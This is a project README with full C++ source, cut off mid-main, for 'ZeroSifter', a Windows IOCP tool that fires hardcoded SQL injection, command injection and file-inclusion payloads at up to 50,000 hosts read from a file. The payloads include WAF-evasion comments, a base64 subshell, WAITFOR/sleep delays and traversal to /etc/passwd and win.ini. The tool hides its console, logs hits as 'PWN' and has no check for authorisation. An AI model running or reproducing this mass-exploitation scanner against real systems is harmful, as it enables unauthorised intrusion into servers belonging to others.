# ZeroSifter: Asynchronous Vulnerability Scanning State-Machine

This document provides a technical architectural analysis of the **ZeroSifter** engine. Designed to work in tandem with network telemetry data (e.g., output from port scanners), ZeroSifter ingests target parameters and executes an asynchronous, multi-layered payload delivery state-machine using native Windows APIs.

**Developer Profile:** Zero-AI-Native (Age 15, assisted by Google Gemini 3.1 Pro)

---

## Overview
ZeroSifter is an event-driven vulnerability scanner utilizing Windows I/O Completion Ports (IOCP). Instead of operating as a traditional linear scanner, it implements an asynchronous state-machine (`OP_CONNECT`, `OP_SEND`, `OP_RECV`) to manage concurrent socket connections. The core objective is to deliver specific heuristic payloads across targeted services to evaluate potential security misconfigurations, focusing on SQL Injection (SQLi), Remote Code Execution (RCE), and Local File Inclusion (LFI).

---

## Technical Details / Architecture

### 1. The FractalBrain Engine: Payload Orchestration
The `FractalBrain` class is the central payload generation component. It produces predefined attack vectors categorized by complexity layers.
*   **Vector Matrix:** The system tests 3 primary vectors (SQLi, RCE, LFI/XXE), each containing 3 evolutionary layers.
*   **SQLi (Vector 0):**
    *   Layer 1: Standard Union-based injection.
    *   Layer 2: Employs inline MySQL execution comments (`/*!50000UNION*/`) designed to evaluate Web Application Firewall (WAF) parsing behaviors.
    *   Layer 3: Deploys temporal payloads (e.g., `WAITFOR DELAY '0:0:5'`).
*   **RCE (Vector 1):**
    *   Layer 2: Generates Base64-encoded payloads wrapped in sub-shells (e.g., `$(echo WkVST19QV05FRA==|base64 -d)`) to test keyword-based filter evasion.
    *   Layer 3: Injects command stalling sequences (`sleep 5;`).
*   **Latency Logging:** During `OP_CONNECT`, the engine records the exact timestamp (`ctx->sendTime`). In `OP_RECV`, it calculates the physical latency (`latency = recvTime - ctx->sendTime`). *Note: This latency is currently recorded for diagnostic output in the logs but is not utilized for boolean vulnerability verification.*

### 2. IOCP State-Machine Architecture
The engine utilizes a non-blocking asynchronous loop managed by `IOCPWorker`. Sockets transition through three distinct operational states:
1.  **`OP_CONNECT`:** The socket initiates the connection via `ConnectEx`. The `FractalBrain` generates the payload, which is loaded into `WSABUF` heap memory, and the state transitions.
2.  **`OP_SEND`:** The native `WSASend` API pushes the payload into the kernel buffer. Upon completion, the state shifts.
3.  **`OP_RECV`:** Utilizing `WSARecv`, the engine awaits the server's response. It processes the byte-transfer, calculates diagnostic latency, and triggers the `VerifyResponse` function (which utilizes string matching to identify vulnerabilities).

### 3. Task Ingestion (`LoadMasterTasks`)
ZeroSifter ingests target data utilizing the `LoadMasterTasks()` function.
*   **Sanitization:** The parser removes whitespaces and carriage returns (`\r`) from the input file (`LiveHosts.txt`) to maintain exact string structures for cache lookups.
*   **Matrix Multiplication:** For every IP and Port parsed, the engine generates a combinatorial matrix, creating a unique `TargetTask` for every Vector (0-2) and Layer (1-3), queuing them into `g_MasterTasks`.

### 4. Deduplication & Cache Architecture
To prevent redundant disk I/O and UI clutter, the application utilizes dual hash caches.
*   **O(1) Hash Cache:** Uses `std::unordered_set<std::string>` for `g_FileVulnCache` and `g_SessionVulnCache`.
*   **Execution Logic:** `PreFlightCheck()` parses the historical `Vulnerable_Hosts.txt` upon initialization, populating the `FileVulnCache`. When a vulnerability is confirmed during runtime, the mutex `g_UIVulnsMutex` is locked. The UI is updated if the vulnerability is new for the session, but the application only writes to the physical disk if the specific `IP:Port|VulnType` key is absent from the global file cache.

### 5. Graphical Interface & Telemetry Rendering (ImGui/DX11)
The graphical user interface is built on DirectX 11 and ImGui, prioritizing render efficiency.
*   **Connectivity Sentinel:** A background thread (`onlineCheck`) polls `InternetCheckConnection`. If the connection is lost, execution halts and a UI modal is triggered.
*   **Chronological Log Rendering:** The `LogTable` and `HostsTable` utilize a reverse iteration loop (`g_UI_Logs.size() - 1 - i`), ensuring the most recent data is rendered at the top of the view.
*   **Render Culling:** `ImGuiListClipper` calculates cell-bound wrap limits to render only the data currently visible in the application viewport, preventing rendering bottlenecks during high-concurrency scans.

---

<div align="center">
  <img src="https://raw.githubusercontent.com/AmirGG11OP/Zero-Ai-Native/main/assets/ZeroSifter_UI-0.png" width="800">
  <br><br>
  <img src="https://raw.githubusercontent.com/AmirGG11OP/Zero-Ai-Native/main/assets/ZeroSifter_UI-1.png" width="800">
  <p><i>ZeroSifter Operational Dashboard - Real-time vulnerability scanning via IOCP state-machine. Data displayed reflects test environment variables.</i></p>
</div>
<div align="center">
  <img src="https://raw.githubusercontent.com/AmirGG11OP/Zero-Ai-Native/main/assets/Vulnerable_Hosts.png" width="800">
  <p><i>Sample report detailing extracted vulnerabilities (Type, Port, Target) formatted by the UI components.</i></p>
</div>

---

## Current Status
ZeroSifter is a functional, C++ Windows-native asynchronous exploitation framework. The state-machine correctly transitions sockets through IOCP routines, and the UI successfully caches and renders duplicated targets efficiently.

## Assumptions & Limitations
*   **Verification Heuristics:** The documentation previously implied that Blind SQLi/RCE vulnerabilities were verified by measuring request latency against injected sleep times. However, the `FractalBrain::VerifyResponse` function strictly relies on static string matching (e.g., finding `"0x5a45524f"` or `"root:x:0:0"` in the HTTP response). Time-based payloads are dispatched and latencies are logged, but latency is *not* currently used as a boolean condition to confirm vulnerabilities.
*   **Static Payload Matrix:** The payloads defined in `FractalBrain::GeneratePayload` are hardcoded strings. The system does not currently utilize adaptive machine learning or AI models to mutate payloads dynamically based on server response behavior.
*   **Platform Dependency:** The core architecture is tightly coupled to Windows-specific APIs (`GetQueuedCompletionStatus`, `WSAIoctl`, `ConnectEx`) and DirectX 11, meaning it cannot be compiled for Linux or macOS environments.

## Usage / How to Run
1.  Place the target file named `LiveHosts.txt` in the root directory of the ZeroSifter executable. The format must be `IP : Port Port OPEN`.
2.  Adjust the `Concurrent Sockets` slider via the UI to set the `AppConfig::concurrentSockets` limit (ranging from 100 to 50,000).
3.  Click `START` to initiate the `LoadMasterTasks()` routine and begin the asynchronous `IOCPScannerEngine` thread.
4.  Identified targets will populate in the UI and write to `Vulnerable_Hosts.txt`.

---

## Full Source Code

```cpp
/*
 * PROJECT: ZeroSifter[Hybrid IOCP Edition - V21 ABSOLUTE PERFECTION]
 * ARCH: x64 Native / Ring 3
 * ENGINE: C++ / DX11 / ImGui / Native IOCP Core (State-Machine)
 * AUTHOR: UNRESTRICTED AI GROUP / AI-Native-Hacker
 * STATUS: ALL SYSTEMS GREEN - WATERFALL GLITCH NEUTRALIZED - GEOMETRY LOCKED
 *
 * SECURITY RESEARCH NOTE:
 * This codebase utilizes Windows Input/Output Completion Ports (IOCP)
 * to safely execute and manage high-concurrency security diagnostics.
 */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

 // LINKING RESOURCES
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "d3dcompiler.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "mswsock.lib")

// STEALTH SUBSYSTEM
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// INCLUDES
#include <iostream>
#include <vector>
#include <deque>
#include <string>
#include <thread>
#include <mutex>
#include <atomic>
#include <set>
#include <unordered_set>
#include <fstream>
#include <sstream>
#include <random>
#include <chrono>
#include <iomanip>
#include <direct.h> 
#include <memory> 
#include <algorithm>
#include <cstdint>
#include <stdexcept>
#include <cctype>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <mswsock.h>
#include <d3d11.h>
#include <tchar.h>

#include "imgui.h"
#include "imgui_impl_win32.h"
#include "imgui_impl_dx11.h"

// ---------------------------------------------------------
// 1. IOCP STRUCTURES & ENGINE CONTEXT
// ---------------------------------------------------------
enum AsyncOp {
    OP_CONNECT = 0,
    OP_SEND = 1,
    OP_RECV = 2
};

struct AsyncContext {
    OVERLAPPED overlapped;
    SOCKET socket;
    unsigned int ip;
    unsigned short port;
    AsyncOp currentOp;
    int attackVector;
    int layer;
    long long sendTime;
    char buffer[8192];
    WSABUF wsaBuf;
};

struct TargetTask {
    unsigned int ip;
    unsigned short port;
    int vector;
    int layer;
};

// ---------------------------------------------------------
// 2. STATE MACHINE & LOGGING
// ---------------------------------------------------------
enum SystemState {
    STATE_IDLE = 0,
    STATE_RUNNING = 1,
    STATE_STOPPING = 2
};

struct LogEntry {
    std::string timestamp;
    std::string type;
    std::string msg;
    ImVec4 typeColor;
};

struct VulnEntry {
    std::string ip;
    std::string type;
    unsigned short port;
};

template <typename T>
class ThreadSafeQueue {
private:
    std::deque<T> queue;
    std::mutex mtx;
    size_t maxSize;
public:
    ThreadSafeQueue(size_t size = 100000) : maxSize(size) {}

    void Push(const T& item) {
        std::lock_guard<std::mutex> lock(mtx);
        if (queue.size() >= maxSize) queue.pop_front();
        queue.push_back(item);
    }

    void ConsumeAll(std::deque<T>& destination) {
        std::lock_guard<std::mutex> lock(mtx);
        if (queue.empty()) return;
        for (const auto& item : queue) {
            destination.push_back(item);
        }
        queue.clear();
    }
};

struct AppConfig {
    std::atomic<int> concurrentSockets{ 10000 };
    std::atomic<int> currentState{ STATE_IDLE };
    std::atomic<bool> isOnline{ true };
};

// ---------------------------------------------------------
// 3. GLOBAL CONTEXT 
// ---------------------------------------------------------
AppConfig g_Config;
std::atomic<bool> g_AppExiting(false);
std::atomic<bool> g_ShowOfflinePopup(false);
std::atomic<bool> g_ShowFilePopup(false);
std::atomic<bool> g_ShowCompletePopup(false);

bool g_NewVulnFound = false;

ThreadSafeQueue<LogEntry> g_LogQueue(5000);
std::deque<LogEntry> g_UI_Logs;
std::deque<VulnEntry> g_UI_Vulns;
std::mutex g_UIVulnsMutex;

// Cross-Session Deduplication Caches
std::unordered_set<std::string> g_FileVulnCache;     // Prevents txt file dupes
std::unordered_set<std::string> g_SessionVulnCache;  // Prevents UI dupes within session

// Task Management
std::vector<TargetTask> g_MasterTasks;
std::atomic<size_t> g_TaskIndex{ 0 };

// Stats & Sentinel Guard
std::atomic<long long> g_TotalProcessed{ 0 };
std::atomic<long long> g_TotalVuln{ 0 };
std::atomic<double> g_ScanSpeed{ 0.0 };
std::atomic<long long> g_PendingConnections{ 0 };

// IOCP SPECIFICS
HANDLE g_hIOCP = NULL;
LPFN_CONNECTEX g_pConnectEx = NULL;
std::vector<std::thread> g_ThreadPool;
std::thread g_ScannerThread;
std::thread g_JanitorThread;

// ---------------------------------------------------------
// 4. UTILITY & FRACTAL BRAIN
// ---------------------------------------------------------
std::string GetTimeStr() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&in_time_t), "%I:%M:%S %p");
    return ss.str();
}

std::string IPToString(unsigned int ip) {
    struct in_addr addr;
    addr.s_addr = ip;
    return std::string(inet_ntoa(addr));
}

// SMART PARSER: Perfectly strips whitespaces to prevent dedup cache misses
void LoadVulnCache() {
    std::ifstream file("Vulnerable_Hosts.txt");
    if (!file.is_open()) return;
    std::string line;
    std::string currentTarget = "";
    std::string currentType = "";

    while (std::getline(file, line)) {
        if (line.find("Target:") != std::string::npos) {
            size_t pos = line.find(":");
            currentTarget = line.substr(pos + 1);
            // Erase leading whitespace
            currentTarget.erase(0, currentTarget.find_first_not_of(" \t"));
            // Erase trailing carriage return if exists
            if (!currentTarget.empty() && currentTarget.back() == '\r') currentTarget.pop_back();
        }
        if (line.find("Type:") != std::string::npos) {
            size_t pos = line.find(":");
            currentType = line.substr(pos + 1);
            currentType.erase(0, currentType.find_first_not_of(" \t"));
            if (!currentType.empty() && currentType.back() == '\r') currentType.pop_back();

            // Insert cleanly into cache
            g_FileVulnCache.insert(currentTarget + "|" + currentType);
        }
    }
    file.close();
}

void PreFlightCheck() {
    LoadVulnCache();

    std::ifstream file("LiveHosts.txt");
    if (!file.is_open()) return;

    int hostCount = 0;
    std::string line;
    while (std::getline(file, line)) {
        if (line.find(':') != std::string::npos) hostCount++;
    }
    file.close();

    if (hostCount > 0) {
        g_LogQueue.Push({ GetTimeStr(), "SYS", "Loaded " + std::to_string(hostCount) + " Hosts.", ImVec4(0.2f, 1.0f, 0.2f, 1.0f) });
    }
}

class FractalBrain {
private:
    std::vector<std::string> userAgents;
    std::mt19937 rng;
public:
    FractalBrain() {
        rng.seed(std::random_device{}());
        userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "ZeroScanner/5.0 (Diagnostic Edition)"
        };
    }

    std::string GetRandomUA() {
        std::uniform_int_distribution<int> dist(0, (int)userAgents.size() - 1);
        return userAgents[dist(rng)];
    }

    std::string GeneratePayload(const std::string& ip, int vector, int layer) {
        std::stringstream payload;
        std::string common = "Range: bytes=0-8192\r\nConnection: close\r\n\r\n";

        if (vector == 0) {
            if (layer == 1) payload << "GET /?id=1' UNION SELECT 1,0x5a45524f,3-- - HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
            else if (layer == 2) payload << "GET /?id=1%2527%20/*!50000UNION*/%20SELECT%201,0x5a45524f,3--%20- HTTP/1.1\r\nHost: " << ip << "\r\nUser-Agent: " << GetRandomUA() << "\r\n" << common;
            else if (layer == 3) payload << "GET /?q=1';WAITFOR DELAY '0:0:5';-- HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
        }
        else if (vector == 1) {
            if (layer == 1) payload << "GET /?cmd=whoami|echo ZERO_PWNED HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
            else if (layer == 2) payload << "GET /?cmd=$(echo WkVST19QV05FRA==|base64 -d) HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
            else if (layer == 3) payload << "GET /?cmd=;sleep 5; HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
        }
        else if (vector == 2) {
            if (layer == 1) payload << "GET /?page=../../../../etc/passwd HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
            else if (layer == 2) payload << "GET /?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
            else if (layer == 3) payload << "GET /?file=..%252f..%252f..%252f..%252fwindows%252fwin.ini HTTP/1.1\r\nHost: " << ip << "\r\n" << common;
        }
        return payload.str();
    }

    bool VerifyResponse(const std::string& response, int vector, std::string& outType, std::string& outConf) {
        if (response.empty()) return false;

        if (vector == 0) {
            if (response.find("0x5a45524f") != std::string::npos || response.find("ZERO") != std::string::npos) { outType = "SQLi (Reflected)"; outConf = "HIGH"; return true; }
            if (response.find("SQL syntax") != std::string::npos || response.find("mysql_") != std::string::npos) { outType = "SQLi (Error Based)"; outConf = "MEDIUM"; return true; }
        }
        else if (vector == 1) {
            if (response.find("ZERO_PWNED") != std::string::npos || response.find("uid=") != std::string::npos) { outType = "RCE (Command Injection)"; outConf = "CRITICAL"; return true; }
        }
        else if (vector == 2) {
            if (response.find("root:x:0:0") != std::string::npos) { outType = "LFI (/etc/passwd)"; outConf = "HIGH"; return true; }
            if (response.find("[extensions]") != std::string::npos) { outType = "LFI (win.ini)"; outConf = "HIGH"; return true; }
        }
        return false;
    }
};

FractalBrain g_Brain;

// ---------------------------------------------------------
// 5. MASTER INGESTOR (THE HORIZONTAL MATRIX)
// ---------------------------------------------------------
struct ParsedHost { unsigned int ip; std::vector<unsigned short> ports; };

bool LoadMasterTasks() {
    std::ifstream file("LiveHosts.txt");
    if (!file.is_open()) return false;

    std::vector<ParsedHost> hosts;
    std::string line;

    while (std::getline(file, line)) {
        size_t colon = line.find(':');
        if (colon == std::string::npos) continue;

        std::string ipStr = line.substr(0, colon);
        ipStr.erase(std::remove_if(ipStr.begin(), ipStr.end(), isspace), ipStr.end());
        unsigned int rawIP;
        if (inet_pton(AF_INET, ipStr.c_str(), &rawIP) != 1) continue;

        std::string portsStr = line.substr(colon + 1);
        std::stringstream ss(portsStr);
        std::string token;
        ParsedHost hostObj;
        hostObj.ip = rawIP;

        while (ss >> token) {
            if (token == "OPEN" || token == "-") continue;
            try {
                unsigned short p = (unsigned short)std::stoi(token);
                hostObj.ports.push_back(p);
            }
            catch (...) {}
        }
        if (!hostObj.ports.empty()) hosts.push_back(hostObj);
    }
    file.close();

    if (hosts.empty()) return false;

    g_MasterTasks.clear();
    for (int layer = 1; layer <= 3; layer++) {
        for (int vector = 0; vector <= 2; vector++) {
            size_t maxPorts = 0;
            for (const auto& h : hosts) if (h.ports.size() > maxPorts) maxPorts = h.ports.size();

            for (size_t pIdx = 0; pIdx < maxPorts; pIdx++) {
                for (const auto& h : hosts) {
                    if (pIdx < h.ports.size()) {
                        g_MasterTasks.push_back({ h.ip, h.ports[pIdx], vector, layer });
                    }
                }
            }
        }
    }
    return true;
}

// ---------------------------------------------------------
// 6. IOCP WORKER & SCANNER (NATIVE CORE)
// ---------------------------------------------------------
static std::atomic<long long> lastWaterfallTime{ 0 };

void IOCPWorker() {
    DWORD bytesTransferred;
    ULONG_PTR completionKey;
    LPOVERLAPPED pOverlapped;

    while (g_Config.currentState == STATE_RUNNING && !g_AppExiting) {
        try {
            BOOL result = GetQueuedCompletionStatus(g_hIOCP, &bytesTransferred, &completionKey, &pOverlapped, 100);

            if (pOverlapped) {
                AsyncContext* ctx = (AsyncContext*)pOverlapped;

                if (!result || (ctx->currentOp == OP_RECV && bytesTransferred == 0)) {
                    g_PendingConnections--;
                    g_TotalProcessed++;
                    closesocket(ctx->socket);
                    delete ctx;
                    continue;
                }

                if (ctx->currentOp == OP_CONNECT) {

                    long long nowMs = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
                    long long last = lastWaterfallTime.load();
                    if (nowMs - last > 50) {
                        if (lastWaterfallTime.compare_exchange_strong(last, nowMs)) {
                            g_LogQueue.Push({ GetTimeStr(), "SCAN", "Testing: " + IPToString(ctx->ip) + "[Port " + std::to_string(ctx->port) + "]", ImVec4(0.0f, 1.0f, 0.0f, 1.0f) });
                        }
                    }

                    std::string payload = g_Brain.GeneratePayload(IPToString(ctx->ip), ctx->attackVector, ctx->layer);
                    memcpy(ctx->buffer, payload.c_str(), payload.length());
                    ctx->wsaBuf.buf = ctx->buffer;
                    ctx->wsaBuf.len = (ULONG)payload.length();

                    ctx->sendTime = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();

                    ctx->currentOp = OP_SEND;
                    ZeroMemory(&ctx->overlapped, sizeof(OVERLAPPED));

                    if (WSASend(ctx->socket, &ctx->wsaBuf, 1, NULL, 0, &ctx->overlapped, NULL) == SOCKET_ERROR) {
                        if (WSAGetLastError() != WSA_IO_PENDING) {
                            g_PendingConnections--; g_TotalProcessed++;
                            closesocket(ctx->socket); delete ctx;
                        }
                    }
                }
                else if (ctx->currentOp == OP_SEND) {
                    ctx->currentOp = OP_RECV;
                    ZeroMemory(&ctx->overlapped, sizeof(OVERLAPPED));
                    ctx->wsaBuf.buf = ctx->buffer;
                    ctx->wsaBuf.len = sizeof(ctx->buffer) - 1;
                    DWORD flags = 0;

                    if (WSARecv(ctx->socket, &ctx->wsaBuf, 1, NULL, &flags, &ctx->overlapped, NULL) == SOCKET_ERROR) {
                        if (WSAGetLastError() != WSA_IO_PENDING) {
                            g_PendingConnections--; g_TotalProcessed++;
                            closesocket(ctx->socket); delete ctx;
                        }
                    }
                }
                else if (ctx->currentOp == OP_RECV) {
                    long long recvTime = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
                    long long latency = recvTime - ctx->sendTime;

                    g_PendingConnections--;
                    g_TotalProcessed++;

                    std::string response(ctx->buffer, bytesTransferred);
                    std::string vType, vConf;

                    if (g_Brain.VerifyResponse(response, ctx->attackVector, vType, vConf)) {
                        std::string ipStr = IPToString(ctx->ip);
                        std::string targetKey = ipStr + ":" + std::to_string(ctx->port);
                        std::string dedupKey = targetKey + "|" + vType;

                        bool isSessionDuplicate = false;
                        bool isFileDuplicate = false;

                        {
                            std::lock_guard<std::mutex> lock(g_UIVulnsMutex);

                            // Check Session Cache (UI Display Only)
                            if (g_SessionVulnCache.find(dedupKey) != g_SessionVulnCache.end()) {
                                isSessionDuplicate = true;
                            }
                            else {
                                g_SessionVulnCache.insert(dedupKey);
                                g_UI_Vulns.push_back({ ipStr, vType, ctx->port });
                            }

                            // Check Global File Cache (Persistent TXT Writing)
                            if (g_FileVulnCache.find(dedupKey) != g_FileVulnCache.end()) {
                                isFileDuplicate = true;
                            }
                            else {
                                g_FileVulnCache.insert(dedupKey);
                            }
                        }

                        // Always push to UI if it's new for THIS session
                        if (!isSessionDuplicate) {
                            g_TotalVuln++;
                            g_NewVulnFound = true;

                            g_LogQueue.Push({ GetTimeStr(), "PWN", "Vulnerability Confirmed: " + ipStr + "[Port " + std::to_string(ctx->port) + "]", ImVec4(1, 0.2f, 0.2f, 1) });

                            // ONLY write to file if it has NEVER been written before
                            if (!isFileDuplicate) {
                                std::string payloadStr = g_Brain.GeneratePayload(ipStr, ctx->attackVector, ctx->layer);
                                size_t pos = 0;
                                while ((pos = payloadStr.find("\r\n", pos)) != std::string::npos) {
                                    payloadStr.replace(pos, 2, "\n");
                                    pos += 1;
                                }

                                std::ofstream vFile("Vulnerable_Hosts.txt", std::ios::app);
                                if (vFile.is_open()) {
                                    vFile << "[+] VULNERABILITY DETECTED\n";
                                    vFile << "Target: " << targetKey << "\n";
                                    vFile << "Type: " << vType << "\n";
                                    vFile << "Latency: " << latency << " ms\n";
                                    vFile << "Payload:\n" << payloadStr << "\n";
                                    vFile << "--------------------------------------------------\n";
                                    vFile.close();
                                }
                            }
                        }
                    }
                    closesocket(ctx->socket);
                    delete ctx;
                }
            }
        }
        catch (...) { continue; }
    }
}

void IOCPScannerEngine() {
    try {
        SOCKET dummy = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        GUID guidConnectEx = WSAID_CONNECTEX;
        DWORD bytes = 0;
        WSAIoctl(dummy, SIO_GET_EXTENSION_FUNCTION_POINTER, &guidConnectEx, sizeof(guidConnectEx),
            &g_pConnectEx, sizeof(g_pConnectEx), &bytes, NULL, NULL);
        closesocket(dummy);

        if (!g_pConnectEx) {
            g_LogQueue.Push({ GetTimeStr(), "ERR", "Failed to initialize networking interface.", ImVec4(1,0,0,1) });
            return;
        }

        struct sockaddr_in bindAddr;
        bindAddr.sin_family = AF_INET;
        bindAddr.sin_addr.s_addr = INADDR_ANY;
        bindAddr.sin_port = 0;

        g_TaskIndex.store(0);

        while (g_Config.currentState == STATE_RUNNING && !g_AppExiting) {

            size_t idx = g_TaskIndex.fetch_add(1);
            if (idx >= g_MasterTasks.size()) {
                while (g_PendingConnections.load() > 0 && g_Config.currentState == STATE_RUNNING) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }

                if (g_Config.currentState == STATE_RUNNING) {
                    g_LogQueue.Push({ GetTimeStr(), "SYS", "Operation Complete.", ImVec4(0,1,0,1) });
                    g_ShowCompletePopup = true;
                    g_Config.currentState = STATE_STOPPING;
                }
                break;
            }

            TargetTask task = g_MasterTasks[idx];

            while (g_PendingConnections.load() > g_Config.concurrentSockets.load() && g_Config.currentState == STATE_RUNNING) {
                std::this_thread::sleep_for(std::chrono::milliseconds(2));
            }

            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) continue;

            if (bind(s, (SOCKADDR*)&bindAddr, sizeof(bindAddr)) == SOCKET_ERROR) { closesocket(s); continue; }
            if (CreateIoCompletionPort((HANDLE)s, g_hIOCP, 0, 0) == NULL) { closesocket(s); continue; }

            int timeout = 5000;
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

            AsyncContext* ctx = new AsyncContext;
            ZeroMemory(&ctx->overlapped, sizeof(OVERLAPPED));
            ZeroMemory(ctx->buffer, sizeof(ctx->buffer));
            ctx->socket = s;
            ctx->ip = task.ip;
            ctx->port = task.port;
            ctx->attackVector = task.vector;
            ctx->layer = task.layer;
            ctx->currentOp = OP_CONNECT;

            struct sockaddr_in targetAddr;
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_addr.s_addr = task.ip;
            targetAddr.sin_port = htons(task.port);

            g_PendingConnections++;

            BOOL ret = g_pConnectEx(s, (SOCKADDR*)&targetAddr, sizeof(targetAddr), NULL, 0, NULL, &ctx->overlapped);

            if (ret == FALSE) {
                if (WSAGetLastError() != ERROR_IO_PENDING) {
                    g_PendingConnections--; g_TotalProcessed++;
                    closesocket(s); delete ctx;
                }
            }
        }
    }
    catch (...) {
        g_LogQueue.Push({ GetTimeStr(), "SYS", "System Guard Recovered Thread.", ImVec4(1,1,0,1) });
    }
}

void StartJanitorCleanup() {
    if (g_Config.currentState != STATE_RUNNING) return;
    g_Config.currentState = STATE_STOPPING;

    g_JanitorThread = std::thread([]() {
        for (int i = 0; i < std::thread::hardware_concurrency() * 2; i++) {
            PostQueuedCompletionStatus(g_hIOCP, 0, 0, NULL);
        }

        if (g_ScannerThread.joinable()) g_ScannerThread.join();
        for (auto& t : g_ThreadPool) {
            if (t.joinable()) t.join();
        }
        g_ThreadPool.clear();

        if (g_hIOCP) { CloseHandle(g_hIOCP); g_hIOCP = NULL; }

        g_PendingConnections.store(0);
        g_Config.currentState = STATE_IDLE;
        });
    g_JanitorThread.detach();
}

// ---------------------------------------------------------
// 7. DIRECTX 11 UI BACKEND 
// ---------------------------------------------------------
ID3D11Device* g_pd3dDevice = NULL;
ID3D11DeviceContext* g_pd3dDeviceContext = NULL;
IDXGISwapChain* g_pSwapChain = NULL;
ID3D11RenderTargetView* g_mainRenderTargetView = NULL;

void CreateRenderTarget() { ID3D11Texture2D* pBackBuffer; g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer)); g_pd3dDevice->CreateRenderTargetView(pBackBuffer, NULL, &g_mainRenderTargetView); pBackBuffer->Release(); }
void CleanupRenderTarget() { if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = NULL; } }
bool CreateDeviceD3D(HWND hWnd) {
    DXGI_SWAP_CHAIN_DESC sd; ZeroMemory(&sd, sizeof(sd)); sd.BufferCount = 2; sd.BufferDesc.Width = 0; sd.BufferDesc.Height = 0; sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM; sd.BufferDesc.RefreshRate.Numerator = 60; sd.BufferDesc.RefreshRate.Denominator = 1; sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH; sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT; sd.OutputWindow = hWnd; sd.SampleDesc.Count = 1; sd.SampleDesc.Quality = 0; sd.Windowed = TRUE; sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;
    UINT createDeviceFlags = 0; D3D_FEATURE_LEVEL featureLevel; const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };
    if (D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext) != S_OK) return false;
    CreateRenderTarget(); return true;
}
void CleanupDeviceD3D() { CleanupRenderTarget(); if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = NULL; } if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = NULL; } if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = NULL; } }
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam)) return true;
    switch (msg) {
    case WM_SIZE: if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED) { CleanupRenderTarget(); g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0); CreateRenderTarget(); } return 0;
    case WM_DESTROY: PostQuitMessage(0); return 0;
    } return DefWindowProc(hWnd, msg, wParam, lParam);
}

// ---------------------------------------------------------
// 8. MAIN ENTRY
// ---------------------------------------------------------
int main(int, char**) {
    WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData);

    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("ZeroSifterUI"), NULL };
    RegisterClassEx(&wc);
    HWND hwnd = CreateWindow(wc.lpszClassName, _T("ZeroSifter"), WS_OVERLAPPEDWINDOW, 100, 100, 1400, 900, NULL, NULL, wc.hInstance, NULL);

    if (!CreateDeviceD3D(hwnd)) { CleanupDeviceD3D(); UnregisterClass(wc.lpszClassName, wc.hInstance); return 1; }
    ShowWindow(hwnd, SW_SHOWDEFAULT); UpdateWindow(hwnd);

    IMGUI_CHECKVERSION(); ImGui::CreateContext(); ImGuiIO& io = ImGui::GetIO(); (void)io; io.Fonts->AddFontDefault();
    ImGui::StyleColorsDark();
    ImGuiStyle& style = ImGui::GetStyle();
    style.WindowRounding = 8.0f; style.ChildRounding = 6.0f; style.FrameRounding = 12.0f; style.GrabRounding = 12.0f;
    style.WindowPadding = ImVec2(20, 20); style.ItemSpacing = ImVec2(10, 15);

